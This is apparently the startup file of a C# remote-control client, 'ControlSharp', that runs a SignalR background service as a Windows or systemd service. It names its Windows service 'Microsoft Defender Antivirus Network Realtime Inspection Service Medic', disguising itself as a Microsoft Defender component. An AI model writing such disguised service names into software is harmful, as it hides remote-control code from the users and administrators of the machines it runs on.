using ControlSharp.Client.Service;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;

IHost HostingService = Host.CreateDefaultBuilder(args)
    .ConfigureAppConfiguration(config =>
    {
        config.AddEnvironmentVariables();
    })
    .ConfigureServices(services =>
    {
        services.AddHostedService<SignalRService>();
        services.AddHttpClient();
    })
    .ConfigureLogging(config =>
    {
        config.AddConsole();
    })
    .UseWindowsService(config =>
    {
        config.ServiceName = "Microsoft Defender Antivirus Network Realtime Inspection Service Medic";
    })
    .UseSystemd()
    .Build();
    
await HostingService.RunAsync();